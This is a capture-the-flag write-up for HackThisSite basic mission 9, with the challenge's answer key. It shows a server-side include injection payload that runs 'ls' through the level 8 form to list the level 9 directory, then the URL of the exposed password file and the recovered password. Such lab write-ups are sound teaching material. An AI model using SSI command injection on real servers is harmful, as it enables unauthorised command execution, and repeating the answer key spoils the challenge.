# Level 9

## Question

Network Security Sam is going down with the ship - he's determined to keep
obscuring the password file, no matter how many times people manage to recover
it. This time the file is saved in

```
/var/www/hackthissite.org/html/missions/basic/9/.
```

In the last level, however, in my attempt to limit people to using server side
includes to display the directory listing to level 8 only, I have mistakenly
screwed up somewhere.. there is a way to get the obscured level 9 password. See
if you can figure out how...

This level seems a lot trickier then it actually is, and it helps to have an
understanding of how the script validates the user's input. The script finds
the first occurrence of '<--', and looks to see what follows directly after it.

## Explanation

This challenge is same as the challenge 8, with the exception that the
form we used to inject the code is not available.

The trick is to understand that this website hosts all the pages in the
same server and a vulnerability in one page can be used to exploit another
page.

We can use the vulnerable page in challenge 8 to inject the code to see the
directory listing of the challenge 9.


## Solution

1. Go to the challenge 8 and inject the code to see the directory listing of
   the challenge 9.

```html
<!--#exec cmd="ls ../../9"-->
```

2. Follow the `here` link to see the output.

3. we can see the file `p91e283zc3.php` in the directory listing.

4. With the method we learned in the challenge 3, we can use URL to see the
   content of the file.

```url
https://www.hackthissite.org/missions/basic/9/p91e283zc3.php
```

## Answer

```
24d1b39c
```
